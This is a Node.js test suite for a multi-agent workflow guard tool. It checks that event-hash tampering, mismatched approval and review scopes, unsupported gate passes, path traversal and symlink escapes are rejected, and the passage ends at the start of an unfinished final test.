test('check-workflow rejects a terminal workflow without a final report', () => {
  const fixture = makeRuntime({
    status: 'READY_FOR_OPERATIONS_HANDOFF',
    phase: 'FINAL_REPORT',
  });
  try {
    clearActiveWorkflows(fixture);
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /FINAL_REPORT_REQUIRED/);
  } finally {
    fixture.cleanup();
  }
});

test('check-workflow rejects a terminal workflow with an empty final report', () => {
  const fixture = makeRuntime({
    status: 'READY_FOR_OPERATIONS_HANDOFF',
    phase: 'FINAL_REPORT',
  });
  try {
    clearActiveWorkflows(fixture);
    writeFileSync(join(fixture.workflowDir, 'final-report.md'), ' \n', 'utf8');
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /FINAL_REPORT_REQUIRED/);
  } finally {
    fixture.cleanup();
  }
});

test('check-workflow rejects a result whose artifact root differs from its task', () => {
  const fixture = makeRuntime({ taskIds: [TASK_ID] });
  try {
    const task = minimalTask(fixture, { status: 'READY' });
    writeJson(join(task.artifact_root_abs, 'output', 'result.json'), {
      schema_version: 1,
      workflow_id: WORKFLOW_ID,
      task_id: TASK_ID,
      run_id: RUN_ID,
      agent_id: 'review-agent',
      role: 'reviewer',
      attempt: 1,
      started_at: '2026-07-29T00:00:00Z',
      finished_at: '2026-07-29T00:00:01Z',
      result_status: 'COMPLETED',
      summary_for_user: 'review complete',
      summary_for_manager: 'review complete',
      worktree_path_abs: fixture.targetRoot,
      artifact_root_abs: join(fixture.runtimeRoot, 'artifacts', 'another-run'),
      isolation_mode: 'UNSANDBOXED_LOCAL',
      self_validation: { preflight_passed: true, checks: [] },
    });
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /RESULT_PATH_MISMATCH/);
  } finally {
    fixture.cleanup();
  }
});

test('check-workflow rejects a command record from another task or run', () => {
  const fixture = makeRuntime({ taskIds: [TASK_ID] });
  try {
    const task = minimalTask(fixture);
    writeJson(join(task.artifact_root_abs, 'output', 'result.json'), {
      schema_version: 1,
      workflow_id: WORKFLOW_ID,
      task_id: TASK_ID,
      run_id: RUN_ID,
      agent_id: 'review-agent',
      role: 'reviewer',
      attempt: 1,
      started_at: '2026-07-29T00:00:00Z',
      finished_at: '2026-07-29T00:00:01Z',
      result_status: 'COMPLETED',
      summary_for_user: 'review complete',
      summary_for_manager: 'review complete',
      worktree_path_abs: fixture.targetRoot,
      artifact_root_abs: task.artifact_root_abs,
      isolation_mode: 'UNSANDBOXED_LOCAL',
      self_validation: { preflight_passed: true, checks: [] },
    });
    writeFileSync(join(task.artifact_root_abs, 'output', 'command-records.jsonl'), `${JSON.stringify({
      command_record_id: 'CMD-0001',
      executable: 'node',
      cwd_abs: fixture.targetRoot,
      started_at: '2026-07-29T00:00:00Z',
      finished_at: '2026-07-29T00:00:01Z',
      exit_code: 0,
      timed_out: false,
      stdout_path_abs: join(task.artifact_root_abs, 'raw-logs', 'stdout.log'),
      stderr_path_abs: join(task.artifact_root_abs, 'raw-logs', 'stderr.log'),
      attempt: 1,
      invoked_by_agent: 'review-agent',
      task_id: 'TASK-00000000-0000-0000-0000-000000000999',
      run_id: RUN_ID,
      isolation_mode: 'UNSANDBOXED_LOCAL',
    })}\n`, 'utf8');
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /COMMAND_RECORD_SCOPE_MISMATCH/);
  } finally {
    fixture.cleanup();
  }
});

test('check-workflow rejects a null or tampered event hash', () => {
  const fixture = makeRuntime();
  try {
    const eventsPath = join(fixture.workflowDir, 'events.jsonl');
    const event = JSON.parse(readFileSync(eventsPath, 'utf8').trim());
    event.event_hash = 'f'.repeat(64);
    writeFileSync(eventsPath, `${JSON.stringify(event)}\n`, 'utf8');
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /EVENT_HASH_MISMATCH/);
  } finally {
    fixture.cleanup();
  }
});

test('check-workflow rejects FAIL items with PASS overall', () => {
  const fixture = makeRuntime();
  try {
    writeJson(join(fixture.workflowDir, 'gates', 'requirement-1.json'), {
      schema_version: 1,
      gate_id: 'GATE-001',
      gate_name: 'RequirementGate',
      workflow_id: WORKFLOW_ID,
      task_id: null,
      checklist_version: 'gate-checklists v1',
      evaluated_at: '2026-07-29T00:00:01Z',
      items: [
        {
          item_id: 'REQ-1',
          description: 'requirements saved',
          status: 'FAIL',
          blocking: true,
          evidence_refs: [],
          notes: 'missing',
        },
      ],
      approved_decision_ids: [],
      overall: 'PASS',
      overall_reason: 'incorrect aggregate',
    });
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /GATE_OVERALL_MISMATCH/);
  } finally {
    fixture.cleanup();
  }
});

test('check-workflow rejects a gate for another workflow', () => {
  const fixture = makeRuntime();
  try {
    writeJson(join(fixture.workflowDir, 'gates', 'requirement-1.json'), {
      schema_version: 1,
      gate_id: 'GATE-001',
      gate_name: 'RequirementGate',
      workflow_id: 'WF-00000000-0000-0000-0000-000000000999',
      task_id: null,
      checklist_version: 'gate-checklists v1',
      evaluated_at: '2026-07-29T00:00:01Z',
      items: [
        {
          item_id: 'REQ-1',
          description: 'requirements saved',
          status: 'PASS',
          blocking: true,
          evidence_refs: [],
          notes: 'present',
        },
      ],
      approved_decision_ids: [],
      overall: 'PASS',
      overall_reason: 'all items pass',
    });
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /GATE_WORKFLOW_MISMATCH/);
  } finally {
    fixture.cleanup();
  }
});

test('check-workflow rejects PASS while an approval is pending', () => {
  const decisionId = 'DEC-00000000-0000-0000-0000-000000000001';
  const fixture = makeRuntime({
    status: 'WAITING_HUMAN',
    phase: 'INTAKE',
    pendingDecisionIds: [decisionId],
  });
  try {
    writeJson(join(fixture.workflowDir, 'decisions', `${decisionId}.request.json`), {
      schema_version: 1,
      decision_id: decisionId,
      workflow_id: WORKFLOW_ID,
      task_id: null,
      run_id: null,
      trigger: 'INPUT_NOT_GIT_REPO',
      summary: 'initialize repository?',
      options: [
        {
          option_id: 'CONTINUE_WITHOUT_GIT',
          description: 'continue without git',
          impact: 'no commit evidence',
          reversibility: 'reversible',
        },
      ],
      recommended_option: null,
      evidence_refs: [],
      created_at: '2026-07-29T00:00:00Z',
      status: 'PENDING',
    });
    writeJson(join(fixture.workflowDir, 'gates', 'requirement-1.json'), {
      schema_version: 1,
      gate_id: 'GATE-001',
      gate_name: 'RequirementGate',
      workflow_id: WORKFLOW_ID,
      task_id: null,
      checklist_version: 'gate-checklists v1',
      evaluated_at: '2026-07-29T00:00:01Z',
      items: [
        {
          item_id: 'REQ-1',
          description: 'requirements saved',
          status: 'PASS',
          blocking: true,
          evidence_refs: [],
          notes: 'present',
        },
      ],
      approved_decision_ids: [],
      overall: 'PASS',
      overall_reason: 'all items pass',
    });
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /PENDING_APPROVAL_BLOCKS_GATE/);
  } finally {
    fixture.cleanup();
  }
});

test('check-workflow rejects approval responses reused across task or run', () => {
  const decisionId = 'DEC-00000000-0000-0000-0000-000000000001';
  const fixture = makeRuntime();
  try {
    writeJson(join(fixture.workflowDir, 'decisions', `${decisionId}.request.json`), {
      schema_version: 1,
      decision_id: decisionId,
      workflow_id: WORKFLOW_ID,
      task_id: TASK_ID,
      run_id: RUN_ID,
      trigger: 'IMPLEMENTATION_TRADEOFF',
      summary: 'choose implementation',
      options: [
        {
          option_id: 'SAFE',
          description: 'safe option',
          impact: 'slower',
          reversibility: 'reversible',
        },
      ],
      recommended_option: null,
      evidence_refs: [],
      created_at: '2026-07-29T00:00:00Z',
      status: 'RESOLVED',
    });
    writeJson(join(fixture.workflowDir, 'decisions', `${decisionId}.response.json`), {
      schema_version: 1,
      decision_id: decisionId,
      workflow_id: WORKFLOW_ID,
      task_id: 'TASK-00000000-0000-0000-0000-000000000999',
      run_id: RUN_ID,
      outcome: 'APPROVED',
      chosen_option_id: 'SAFE',
      raw_user_reply_summary: 'approved safe option',
      decided_by: 'user',
      decided_at: '2026-07-29T00:00:01Z',
      notes: '',
    });
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /APPROVAL_SCOPE_MISMATCH/);
  } finally {
    fixture.cleanup();
  }
});

test('check-workflow rejects a gate approval requested for another workflow', () => {
  const decisionId = 'DEC-00000000-0000-0000-0000-000000000001';
  const fixture = makeRuntime();
  try {
    writeJson(join(fixture.workflowDir, 'decisions', `${decisionId}.request.json`), {
      schema_version: 1,
      decision_id: decisionId,
      workflow_id: 'WF-00000000-0000-0000-0000-000000000999',
      task_id: null,
      run_id: null,
      trigger: 'IMPLEMENTATION_TRADEOFF',
      summary: 'choose implementation',
      options: [
        {
          option_id: 'SAFE',
          description: 'safe option',
          impact: 'slower',
          reversibility: 'reversible',
        },
      ],
      recommended_option: null,
      evidence_refs: [],
      created_at: '2026-07-29T00:00:00Z',
      status: 'RESOLVED',
    });
    writeJson(join(fixture.workflowDir, 'decisions', `${decisionId}.response.json`), {
      schema_version: 1,
      decision_id: decisionId,
      workflow_id: 'WF-00000000-0000-0000-0000-000000000999',
      task_id: null,
      run_id: null,
      outcome: 'APPROVED',
      chosen_option_id: 'SAFE',
      raw_user_reply_summary: 'approved safe option',
      decided_by: 'user',
      decided_at: '2026-07-29T00:00:01Z',
      notes: '',
    });
    writeJson(join(fixture.workflowDir, 'gates', 'development-1.json'), {
      schema_version: 1,
      gate_id: 'GATE-DEV-001',
      gate_name: 'DevelopmentGate',
      workflow_id: WORKFLOW_ID,
      task_id: null,
      checklist_version: 'gate-checklists v1',
      evaluated_at: '2026-07-29T00:00:01Z',
      items: [
        {
          item_id: 'DEV-1',
          description: 'approval recorded',
          status: 'PASS',
          blocking: true,
          evidence_refs: [],
          notes: 'present',
        },
      ],
      approved_decision_ids: [decisionId],
      overall: 'PASS',
      overall_reason: 'all items pass',
    });
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /APPROVAL_WORKFLOW_MISMATCH/);
  } finally {
    fixture.cleanup();
  }
});

test('check-workflow rejects release PASS with open HIGH findings', () => {
  const fixture = makeRuntime({
    status: 'VERIFYING_RELEASE_READINESS',
    phase: 'RELEASE_VERIFICATION',
    withCurrentCandidate: true,
    taskIds: [TASK_ID, TASK_ID_2],
  });
  try {
    const reviewTask = scopedTask(fixture);
    const currentReleaseTask = releaseTask(fixture, {
      task_id: TASK_ID_2,
      run_id: RUN_ID_2,
    });
    appendTaskLifecycle(fixture, reviewTask);
    appendTaskLifecycle(fixture, currentReleaseTask);
    writeTaskResult(reviewTask);
    writeTaskResult(currentReleaseTask);
    writeTaskEvidence(currentReleaseTask, ['EVD-release-open-finding']);
    writeReviewFindings(reviewTask, {
      verdict: 'REQUEST_CHANGES',
      findings: [
        reviewFinding({
          finding_id: 'FIND-0001',
          category: 'security',
          title: 'unsafe token storage',
          description: 'token stored in localStorage',
          file: 'src/auth.js',
          line: 10,
          commit: fixture.currentCandidateCommit,
          remediation: 'use an HttpOnly cookie',
        }),
      ],
    });
    writeReleaseDecision(currentReleaseTask, {
      evidenceId: 'EVD-release-open-finding',
    });
    writeReleaseGate(fixture, {
      taskId: currentReleaseTask.task_id,
      evidenceId: 'EVD-release-open-finding',
      overall: 'PASS',
    });
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /OPEN_BLOCKING_FINDING/);
  } finally {
    fixture.cleanup();
  }
});

test('check-workflow accepts a consistent minimal workflow', () => {
  const fixture = makeRuntime();
  try {
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 0, result.stdout || result.stderr);
    const payload = JSON.parse(result.stdout);
    assert.equal(payload.ok, true);
    assert.equal(payload.workflow_id, WORKFLOW_ID);
    assert.equal(payload.effective_status, 'CREATED');
  } finally {
    fixture.cleanup();
  }
});

test('validate-file rejects a Draft-07 false schema', () => {
  const root = mkdtempSync(join(tmpdir(), 'openclaw-runtime-guard-false-schema-'));
  try {
    const schemaPath = join(root, 'false.schema.json');
    const valuePath = join(root, 'value.json');
    writeFileSync(schemaPath, 'false\n', 'utf8');
    writeJson(valuePath, { any: 'value' });
    const result = runGuard(['validate-file', '--schema', schemaPath, '--file', valuePath]);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /SCHEMA_FALSE/);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('check-workflow rejects a cancelled approval reused by a gate', () => {
  const decisionId = 'DEC-00000000-0000-0000-0000-000000000001';
  const fixture = makeRuntime();
  try {
    writeJson(join(fixture.workflowDir, 'decisions', `${decisionId}.request.json`), { schema_version: 1, decision_id: decisionId, workflow_id: WORKFLOW_ID, task_id: null, run_id: null, trigger: 'IMPLEMENTATION_TRADEOFF', summary: 'x', options: [{ option_id: 'A', description: 'a', impact: 'i', reversibility: 'reversible' }], recommended_option: null, evidence_refs: [], created_at: '2026-07-29T00:00:00Z', status: 'CANCELLED' });
    writeJson(join(fixture.workflowDir, 'decisions', `${decisionId}.response.json`), { schema_version: 1, decision_id: decisionId, workflow_id: WORKFLOW_ID, task_id: null, run_id: null, outcome: 'APPROVED', chosen_option_id: 'A', raw_user_reply_summary: 'yes', decided_by: 'user', decided_at: '2026-07-29T00:00:01Z', notes: '' });
    writeJson(join(fixture.workflowDir, 'gates', 'gate.json'), { schema_version: 1, gate_id: 'GATE-001', gate_name: 'DevelopmentGate', workflow_id: WORKFLOW_ID, task_id: null, checklist_version: 'v1', evaluated_at: '2026-07-29T00:00:01Z', items: [{ item_id: 'I', description: 'd', status: 'PASS', blocking: false, evidence_refs: [], notes: '' }], approved_decision_ids: [decisionId], overall: 'PASS', overall_reason: 'x' });
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /CANCELLED_APPROVAL_HAS_RESPONSE|GATE_APPROVAL_NOT_RESOLVED/);
  } finally { fixture.cleanup(); }
});

test('check-workflow blocks an open HIGH finding even when nonblocking', () => {
  const fixture = makeRuntime({
    withCurrentCandidate: true,
    taskIds: [TASK_ID],
  });
  try {
    const task = scopedTask(fixture);
    appendTaskLifecycle(fixture, task);
    writeTaskResult(task);
    writeTaskEvidence(task, ['EVD-nonblocking-high']);
    writeReviewFindings(task, {
      verdict: 'REQUEST_CHANGES',
      findings: [reviewFinding({
        finding_id: 'FIND-1',
        category: 'security',
        blocking: false,
      })],
    });
    writePassGate(fixture, {
      evidenceId: 'EVD-nonblocking-high',
      gateName: 'SecurityGate',
    });
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /OPEN_BLOCKING_FINDING/);
  } finally { fixture.cleanup(); }
});

test('check-workflow rejects a PASS release gate without a matching release decision', () => {
  const fixture = makeRuntime();
  try {
    writeJson(join(fixture.workflowDir, 'gates', 'release.json'), { schema_version: 1, gate_id: 'GATE-001', gate_name: 'ReleaseReadinessGate', workflow_id: WORKFLOW_ID, task_id: null, checklist_version: 'v1', evaluated_at: '2026-07-29T00:00:01Z', items: [{ item_id: 'I', description: 'd', status: 'PASS', blocking: false, evidence_refs: [], notes: '' }], approved_decision_ids: [], overall: 'PASS', overall_reason: 'x' });
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /RELEASE_DECISION_REQUIRED/);
  } finally { fixture.cleanup(); }
});

test('append-event rejects a semantically invalid workflow transition', () => {
  const fixture = makeRuntime();
  try {
    const draftPath = join(fixture.root, 'bad-event.json');
    writeJson(draftPath, { event_id: 'EVT-00000000-0000-0000-0000-000000000002', timestamp: '2026-07-29T00:00:01Z', workflow_id: WORKFLOW_ID, task_id: null, run_id: null, actor: 'manager-agent', event_type: 'PHASE_ADVANCED', from_status: 'CREATED', to_status: 'TESTING', from_phase: 'INTAKE', to_phase: 'TESTING', task_status_before: null, task_status_after: null, candidate_commit: null, payload: {} });
    const result = runGuard(['append-event', '--project-root', ROOT, '--events', join(fixture.workflowDir, 'events.jsonl'), '--event', draftPath]);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /INVALID_WORKFLOW_TRANSITION/);
  } finally { fixture.cleanup(); }
});

test('check-workflow rejects a traversal workflow id before reading control files', () => {
  const fixture = makeRuntime();
  try {
    const result = runGuard(['check-workflow', '--project-root', ROOT, '--runtime-root', fixture.runtimeRoot, '--workflow-id', '../x']);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /INVALID_WORKFLOW_ID/);
  } finally { fixture.cleanup(); }
});

test('check-workflow has no public skip-git bypass', () => {
  const fixture = makeRuntime();
  try {
    const result = runGuard(['check-workflow', '--project-root', ROOT, '--runtime-root', fixture.runtimeRoot, '--workflow-id', WORKFLOW_ID, '--skip-git']);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /unknown option: --skip-git/);
  } finally { fixture.cleanup(); }
});

test('append-event preserves a pre-existing lock on conflict', () => {
  const fixture = makeRuntime();
  try {
    const eventsPath = join(fixture.workflowDir, 'events.jsonl');
    writeFileSync(`${eventsPath}.lock`, 'other owner\n', 'utf8');
    const draftPath = join(fixture.root, 'draft.json');
    writeJson(draftPath, { event_id: 'EVT-00000000-0000-0000-0000-000000000002', timestamp: '2026-07-29T00:00:01Z', workflow_id: WORKFLOW_ID, task_id: null, run_id: null, actor: 'manager-agent', event_type: 'PHASE_ADVANCED', from_status: 'CREATED', to_status: 'ANALYZING_REQUIREMENTS', from_phase: 'INTAKE', to_phase: 'REQUIREMENTS', task_status_before: null, task_status_after: null, candidate_commit: null, payload: {} });
    const result = runGuard(['append-event', '--project-root', ROOT, '--events', eventsPath, '--event', draftPath]);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /EVENT_LOCK_CONFLICT/);
    assert.equal(existsSync(`${eventsPath}.lock`), true);
  } finally { fixture.cleanup(); }
});

test('check-workflow rejects duplicate event ids', () => {
  const first = signedEvent({ seq: 1, event_type: 'WORKFLOW_CREATED', to_status: 'CREATED', to_phase: 'INTAKE' });
  const second = signedEvent({ seq: 2, event_type: 'PHASE_ADVANCED', from_status: 'CREATED', to_status: 'ANALYZING_REQUIREMENTS', from_phase: 'INTAKE', to_phase: 'REQUIREMENTS', previous_event_hash: first.event_hash });
  second.event_id = first.event_id;
  const unsigned = { ...second };
  delete unsigned.event_hash;
  second.event_hash = createHash('sha256').update(JSON.stringify(canonicalize(unsigned)), 'utf8').digest('hex');
  const fixture = makeRuntime({ status: 'ANALYZING_REQUIREMENTS', phase: 'REQUIREMENTS', revision: 2, events: [first, second] });
  try {
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /DUPLICATE_EVENT_ID/);
  } finally { fixture.cleanup(); }
});

test('append-event recovers a lock owned by a dead local process', () => {
  const fixture = makeRuntime();
  try {
    const eventsPath = join(fixture.workflowDir, 'events.jsonl');
    writeJson(`${eventsPath}.lock`, {
      schema_version: 1,
      nonce: '00000000-0000-4000-8000-000000000001',
      pid: 2147483647,
      hostname: hostname(),
      purpose: 'append-event',
      acquired_at: new Date().toISOString(),
      expires_at: new Date(Date.now() + 120000).toISOString(),
    });
    const draftPath = join(fixture.root, 'draft.json');
    writeJson(draftPath, { event_id: 'EVT-00000000-0000-0000-0000-000000000002', timestamp: '2026-07-29T00:00:01Z', workflow_id: WORKFLOW_ID, task_id: null, run_id: null, actor: 'manager-agent', event_type: 'PHASE_ADVANCED', from_status: 'CREATED', to_status: 'ANALYZING_REQUIREMENTS', from_phase: 'INTAKE', to_phase: 'REQUIREMENTS', task_status_before: null, task_status_after: null, candidate_commit: null, payload: {} });
    const result = runGuard(['append-event', '--project-root', ROOT, '--events', eventsPath, '--event', draftPath]);
    assert.equal(result.status, 0, result.stdout || result.stderr);
    assert.equal(existsSync(`${eventsPath}.lock`), false);
    assert.ok(readdirSync(fixture.workflowDir).some((name) => name.startsWith('events.jsonl.lock.stale-')));
  } finally { fixture.cleanup(); }
});

test('check-workflow rejects a first self-transition from RUNNING', () => {
  const first = signedEvent({ seq: 1, event_type: 'WORKFLOW_CREATED', to_status: 'CREATED', to_phase: 'INTAKE' });
  const second = signedEvent({ seq: 2, event_type: 'TASK_PING', from_status: 'CREATED', to_status: 'CREATED', from_phase: 'INTAKE', to_phase: 'INTAKE', task_id: TASK_ID, run_id: RUN_ID, task_status_before: 'RUNNING', task_status_after: 'RUNNING', previous_event_hash: first.event_hash });
  const fixture = makeRuntime({ revision: 2, events: [first, second], taskIds: [TASK_ID] });
  try {
    const artifactRoot = join(fixture.runtimeRoot, 'artifacts', WORKFLOW_ID, TASK_ID, RUN_ID);
    const worktree = join(fixture.runtimeRoot, 'worktrees', WORKFLOW_ID, TASK_ID, RUN_ID, 'repo');
    mkdirSync(artifactRoot, { recursive: true });
    mkdirSync(worktree, { recursive: true });
    minimalTask(fixture, { status: 'RUNNING', artifact_root_abs: artifactRoot, worktree_path_abs: worktree });
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /INVALID_INITIAL_TASK_TRANSITION/);
  } finally { fixture.cleanup(); }
});

test('check-workflow rejects a workflow directory symlink outside runtime control', (t) => {
  const fixture = makeRuntime();
  try {
    const outside = join(fixture.root, 'outside');
    mkdirSync(outside);
    const realWorkflow = fixture.workflowDir;
    const moved = join(outside, WORKFLOW_ID);
    renameSync(realWorkflow, moved);
    try {
      symlinkSync(moved, realWorkflow, 'dir');
    } catch (error) {
      if (error?.code === 'EPERM') t.skip('当前 Windows 会话无创建符号链接权限');
      else throw error;
      return;
    }
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /WORKFLOW_DIR_ESCAPE/);
  } finally { fixture.cleanup(); }
});

test('check-workflow rejects a gate approval from a previous run of the same task', () => {
  const first = signedEvent({ seq: 1, event_type: 'WORKFLOW_CREATED', to_status: 'CREATED', to_phase: 'INTAKE' });
  const second = signedEvent({ seq: 2, event_type: 'TASK_READY', from_status: 'CREATED', to_status: 'CREATED', from_phase: 'INTAKE', to_phase: 'INTAKE', task_id: TASK_ID, run_id: RUN_ID, task_status_before: 'CREATED', task_status_after: 'READY', previous_event_hash: first.event_hash });
  const decisionId = 'DEC-00000000-0000-0000-0000-000000000001';
  const fixture = makeRuntime({ revision: 2, events: [first, second], taskIds: [TASK_ID] });
  try {
    const artifactRoot = join(fixture.runtimeRoot, 'artifacts', WORKFLOW_ID, TASK_ID, RUN_ID);
    const worktree = join(fixture.runtimeRoot, 'worktrees', WORKFLOW_ID, TASK_ID, RUN_ID, 'repo');
    mkdirSync(artifactRoot, { recursive: true }); mkdirSync(worktree, { recursive: true });
    minimalTask(fixture, { status: 'READY', artifact_root_abs: artifactRoot, worktree_path_abs: worktree });
    writeJson(join(fixture.workflowDir, 'decisions', `${decisionId}.request.json`), { schema_version: 1, decision_id: decisionId, workflow_id: WORKFLOW_ID, task_id: TASK_ID, run_id: 'RUN-00000000-0000-0000-0000-000000000999', trigger: 'IMPLEMENTATION_TRADEOFF', summary: 'x', options: [{ option_id: 'A', description: 'a', impact: 'i', reversibility: 'reversible' }], recommended_option: null, evidence_refs: [], created_at: '2026-07-29T00:00:00Z', status: 'RESOLVED' });
    writeJson(join(fixture.workflowDir, 'decisions', `${decisionId}.response.json`), { schema_version: 1, decision_id: decisionId, workflow_id: WORKFLOW_ID, task_id: TASK_ID, run_id: 'RUN-00000000-0000-0000-0000-000000000999', outcome: 'APPROVED', chosen_option_id: 'A', raw_user_reply_summary: 'yes', decided_by: 'user', decided_at: '2026-07-29T00:00:01Z', notes: '' });
    writeJson(join(fixture.workflowDir, 'gates', 'gate.json'), { schema_version: 1, gate_id: 'GATE-001', gate_name: 'DevelopmentGate', workflow_id: WORKFLOW_ID, task_id: TASK_ID, checklist_version: 'v1', evaluated_at: '2026-07-29T00:00:01Z', items: [{ item_id: 'I', description: 'd', status: 'PASS', blocking: false, evidence_refs: [], notes: '' }], evidence_refs: ['EVD-none'], approved_decision_ids: [decisionId], overall: 'PASS', overall_reason: 'x' });
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /GATE_APPROVAL_SCOPE_MISMATCH/);
  } finally { fixture.cleanup(); }
});

test('check-workflow requires evidence for every PASS gate item', () => {
  const fixture = makeRuntime();
  try {
    writeJson(join(fixture.workflowDir, 'gates', 'gate.json'), { schema_version: 1, gate_id: 'GATE-001', gate_name: 'DevelopmentGate', workflow_id: WORKFLOW_ID, task_id: null, checklist_version: 'v1', evaluated_at: '2026-07-29T00:00:01Z', items: [{ item_id: 'I', description: 'd', status: 'PASS', blocking: false, evidence_refs: [], notes: '' }], evidence_refs: [], approved_decision_ids: [], overall: 'PASS', overall_reason: 'x' });
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /GATE_EVIDENCE_REQUIRED/);
  } finally { fixture.cleanup(); }
});

test('check-workflow rejects a control workflows parent symlink outside runtime root', (t) => {
  const fixture = makeRuntime();
  try {
    const workflowsRoot = join(fixture.runtimeRoot, 'control', 'workflows');
    const outside = join(fixture.root, 'outside-workflows');
    renameSync(workflowsRoot, outside);
    try {
      symlinkSync(outside, workflowsRoot, 'dir');
    } catch (error) {
      if (error?.code === 'EPERM') t.skip('当前 Windows 会话无创建符号链接权限');
      else throw error;
      return;
    }
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /RUNTIME_ROOT_ESCAPE/);
  } finally { fixture.cleanup(); }
});

test('check-workflow rejects review findings outside workflow, task, commit, or agent authority', async (t) => {
  const cases = [
    {
      name: 'workflow mismatch',
      reviewOverrides: { workflow_id: 'WF-00000000-0000-0000-0000-000000000999' },
    },
    {
      name: 'task mismatch',
      reviewOverrides: { task_id: 'TASK-00000000-0000-0000-0000-000000000999' },
    },
    {
      name: 'reviewed commit differs from task input',
      reviewOverrides: { reviewed_commit: 'f'.repeat(40) },
    },
    {
      name: 'task is assigned to another agent',
      taskOverrides: { assigned_agent: 'developer-agent' },
    },
  ];
  for (const testCase of cases) {
    await t.test(testCase.name, () => {
      const fixture = makeRuntime({
        withCurrentCandidate: true,
        taskIds: [TASK_ID],
      });
      try {
        const task = scopedTask(fixture, testCase.taskOverrides);
        appendTaskLifecycle(fixture, task);
        writeTaskResult(task);
        writeReviewFindings(task, testCase.reviewOverrides);
        const result = checkWorkflow(fixture);
        assert.equal(result.status, 1);
        assert.match(result.stdout, /REVIEW_SCOPE_MISMATCH/);
      } finally {
        fixture.cleanup();
      }
    });
  }
});

test('check-workflow rejects review finding evidence from another task or run', () => {
  const fixture = makeRuntime({
    withCurrentCandidate: true,
    taskIds: [TASK_ID, TASK_ID_2],
  });
  try {
    const reviewTask = scopedTask(fixture);
    const otherTask = scopedTask(fixture, {
      task_id: TASK_ID_2,
      run_id: RUN_ID_2,
    });
    appendTaskLifecycle(fixture, reviewTask);
    appendTaskLifecycle(fixture, otherTask);
    writeTaskResult(reviewTask);
    writeTaskResult(otherTask);
    writeTaskEvidence(otherTask, ['EVD-other-review-run']);
    writeReviewFindings(reviewTask, {
      verdict: 'REQUEST_CHANGES',
      findings: [reviewFinding({ evidence: ['EVD-other-review-run'] })],
    });
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /EVIDENCE_REFERENCE_NOT_FOUND/);
  } finally {
    fixture.cleanup();
  }
});

test('check-workflow ignores an open finding reviewed against an older candidate for ordinary gates', () => {
  const fixture = makeRuntime({
    withCurrentCandidate: true,
    taskIds: [TASK_ID],
  });
  try {
    const oldCommit = 'c'.repeat(40);
    const task = scopedTask(fixture, { input_commit: oldCommit });
    appendTaskLifecycle(fixture, task);
    writeTaskResult(task);
    writeTaskEvidence(task, ['EVD-old-candidate-review']);
    writeReviewFindings(task, {
      reviewed_commit: oldCommit,
      verdict: 'REQUEST_CHANGES',
      findings: [reviewFinding({ commit: oldCommit })],
    });
    writePassGate(fixture, {
      evidenceId: 'EVD-old-candidate-review',
      gateName: 'DevelopmentGate',
    });
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 0, result.stdout || result.stderr);
  } finally {
    fixture.cleanup();
  }
});

test('check-workflow rejects a PASS security gate without current-candidate review evidence', () => {
  const fixture = makeRuntime({
    withCurrentCandidate: true,
    taskIds: [TASK_ID],
  });
  try {
    const oldCommit = 'c'.repeat(40);
    const task = scopedTask(fixture, { input_commit: oldCommit });
    appendTaskLifecycle(fixture, task);
    writeTaskResult(task);
    writeTaskEvidence(task, ['EVD-old-candidate-review']);
    writeReviewFindings(task, {
      reviewed_commit: oldCommit,
      verdict: 'REQUEST_CHANGES',
      findings: [reviewFinding({ commit: oldCommit })],
    });
    writePassGate(fixture, {
      evidenceId: 'EVD-old-candidate-review',
      gateName: 'SecurityGate',
    });
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /CURRENT_REVIEW_EVIDENCE_REQUIRED/);
  } finally {
    fixture.cleanup();
  }
});

test('check-workflow accepts a PASS security gate backed by current-candidate clean review evidence', () => {
  const fixture = makeRuntime({
    withCurrentCandidate: true,
    taskIds: [TASK_ID],
  });
  try {
    const task = scopedTask(fixture);
    appendTaskLifecycle(fixture, task);
    writeTaskResult(task);
    writeTaskEvidence(task, ['EVD-current-clean-review']);
    writeReviewFindings(task, {
      verdict: 'APPROVE',
      findings: [],
    });
    writePassGate(fixture, {
      evidenceId: 'EVD-current-clean-review',
      gateName: 'SecurityGate',
    });
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 0, result.stdout || result.stderr);
  } finally {
    fixture.cleanup();
  }
});

test('check-workflow lets a later current-candidate RESOLVED finding close an earlier OPEN finding', () => {
